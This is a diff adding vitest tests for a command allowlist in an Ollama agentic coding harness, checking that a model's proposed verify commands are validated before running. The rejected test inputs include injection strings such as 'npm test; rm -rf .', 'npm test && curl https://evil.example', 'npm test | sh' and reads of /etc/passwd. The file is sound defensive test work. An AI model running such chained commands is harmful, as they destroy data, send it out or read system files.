@@ -4,7 +4,13 @@ import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { afterEach, describe, expect, it } from 'vitest';
 import { codingHarnessContractCases, makeContractRequest } from './contract.js';
-import { OllamaAgenticHarness, OllamaAgenticExecFn, PATCH_PROPOSAL_SCHEMA } from './ollama-agentic.js';
+import {
+  ALLOWED_VERIFY_COMMAND_PREFIXES,
+  OllamaAgenticHarness,
+  OllamaAgenticExecFn,
+  PATCH_PROPOSAL_SCHEMA,
+  validateVerifyCommand,
+} from './ollama-agentic.js';
 import type { OllamaFetchFn } from './ollama-http.js';
 import { HarnessError } from './index.js';
 import { ModelRegistry } from '../models/index.js';
@@ -208,6 +214,148 @@ describe('OllamaAgenticHarness apply failures', () => {
     const trace = JSON.parse(await readFile(tracePath, 'utf-8'));
     expect(trace.malformedReason).toBe('apply_failed');
     expect(await readFile(targetPath, 'utf-8')).toBe('original content\n');
+  });
+});
+
+describe('validateVerifyCommand', () => {
+  it.each([
+    'npm test',
+    'npm test -- packages/core/src/harness/ollama-agentic.test.ts',
+    'npm run lint',
+    'npm run typecheck',
+    'npx vitest run packages/core',
+    'test -f docs/local-small-first-green.md',
+    'true',
+  ])('accepts %s', command => {
+    expect(validateVerifyCommand(command)).toEqual({ ok: true });
+  });
+
+  it.each([
+    ['npm test; rm -rf .', 'npm test; rm -rf .'],
+    ['npm test && curl https://evil.example', 'npm test && curl https://evil.example'],
+    ['npm test | sh', 'npm test | sh'],
+    ['echo $(whoami)', 'echo $(whoami)'],
+    ['npm test `id`', 'npm test `id`'],
+    ['npm test > out.txt', 'npm test > out.txt'],
+    ['test -f /etc/passwd', 'test -f /etc/passwd'],
+    ['test -f ../outside.md', 'test -f ../outside.md'],
+    ['curl https://example.com', 'curl https://example.com'],
+    ['rm -rf .', 'rm -rf .'],
+    ['truely', 'truely'],
+    ['npm testfoo', 'npm testfoo'],
+    ["npm test -- 'a b'", "npm test -- 'a b'"],
+    ['npm\ttest', 'npm\\ttest'],
+  ])('rejects %s', (command, expectedInDetail) => {
+    const result = validateVerifyCommand(command);
+    expect(result.ok).toBe(false);
+    expect((result as { ok: false; detail: string }).detail).toContain(expectedInDetail);
+  });
+
+  it('names an allowed prefix when the command is unknown', () => {
+    const result = validateVerifyCommand('curl https://example.com');
+    expect(result.ok).toBe(false);
+    expect((result as { ok: false; detail: string }).detail).toContain(ALLOWED_VERIFY_COMMAND_PREFIXES[0]);
+  });
+});
+
+describe('OllamaAgenticHarness verify command allowlist', () => {
+  it('executes an allowed compound command exactly as proposed', async () => {
+    const worktree = makeWorktree();
+    const proposal = JSON.stringify({
+      summary: 'add first-green marker',
+      changes: [{
+        file: 'docs/local-small-first-green.md',
+        find: '',
+        replace: '# Local-Small First Green\n\nThis file is the canonical tiny success target for local-small factory runs.\n',
+      }],
+      verifyCommand: 'npm test -- packages/core/src/harness/ollama-agentic.test.ts',
+    });
+    const fetchFn = stubFetch([proposal]);
+    const calls: string[] = [];
+    const exec: OllamaAgenticExecFn = async cmd => {
+      calls.push(cmd);
+      return { stdout: '', stderr: '' };
+    };
+    const harness = new OllamaAgenticHarness(fetchFn, exec);
+
+    const result = await harness.run(makeContractRequest({ model: 'local-agentic-model', registry, worktree }));
+
+    expect(calls).toEqual(['npm test -- packages/core/src/harness/ollama-agentic.test.ts']);
+    expect(result.output).toContain('VERIFIED: npm test -- packages/core/src/harness/ollama-agentic.test.ts');
+  });
+
+  it('rejects a verify command with shell metacharacters before executing or writing files', async () => {
+    const worktree = makeWorktree();
+    const badProposal = JSON.stringify({
+      summary: 'add file',
+      changes: [{ file: 'docs/x.md', find: '', replace: 'content' }],
+      verifyCommand: 'test -f docs/x.md; curl https://example.com',
+    });
+    const fetchFn = stubFetch([badProposal, badProposal]);
+    const calls: string[] = [];
+    const exec: OllamaAgenticExecFn = async cmd => {
+      calls.push(cmd);
+      return { stdout: '', stderr: '' };
+    };
+    const harness = new OllamaAgenticHarness(fetchFn, exec);
+
+    const err: any = await harness.run(makeContractRequest({ model: 'local-agentic-model', registry, worktree })).catch(e => e);
+
+    expect(err).toBeInstanceOf(HarnessError);
+    expect(err.reason).toBe('schema_invalid');
+    expect(calls).toEqual([]);
+    expect(existsSync(join(worktree, 'docs/x.md'))).toBe(false);
+
+    const tracePath = err.message.match(/trace written to (.+)$/)[1];
+    const trace = JSON.parse(await readFile(tracePath, 'utf-8'));
+    expect(trace.malformedReason).toBe('schema_invalid');
+    expect(trace.detail).toContain('test -f docs/x.md; curl https://example.com');
+  });
+
+  it('rejects an unknown command and asks the repair prompt for a permitted one', async () => {
+    const worktree = makeWorktree();
+    const badProposal = JSON.stringify({
+      summary: 'add file',
+      changes: [{
+        file: 'docs/local-small-first-green.md',
+        find: '',
+        replace: '# Local-Small First Green\n\nThis file is the canonical tiny success target for local-small factory runs.\n',
+      }],
+      verifyCommand: 'curl https://example.com',
+    });
+    const fetchFn = stubFetch([badProposal, firstGreenProposal()]);
+    const harness = new OllamaAgenticHarness(fetchFn, okExec);
+
+    const result = await harness.run(makeContractRequest({ model: 'local-agentic-model', registry, worktree }));
+
+    expect(result.output).toContain('docs/local-small-first-green.md');
+    expect(fetchFn.calls).toHaveLength(2);
+    const secondPrompt = JSON.parse(fetchFn.calls[1].init.body).messages[0].content;
+    expect(secondPrompt).toContain('schema_invalid');
+    expect(secondPrompt).toContain('curl https://example.com');
+    expect(secondPrompt).toContain('npm test');
+  });
+
+  it('rejects an absolute-path verify command', async () => {
+    const worktree = makeWorktree();
+    const badProposal = JSON.stringify({
+      summary: 'add file',
+      changes: [{ file: 'docs/x.md', find: '', replace: 'content' }],
+      verifyCommand: '/bin/sh -c anything',
+    });
+    const fetchFn = stubFetch([badProposal, badProposal]);
+    const calls: string[] = [];
+    const exec: OllamaAgenticExecFn = async cmd => {
+      calls.push(cmd);
+      return { stdout: '', stderr: '' };
+    };
+    const harness = new OllamaAgenticHarness(fetchFn, exec);
+
+    const err: any = await harness.run(makeContractRequest({ model: 'local-agentic-model', registry, worktree })).catch(e => e);
+
+    expect(err).toBeInstanceOf(HarnessError);
+    expect(err.reason).toBe('schema_invalid');
+    expect(calls).toEqual([]);
   });
 });
 
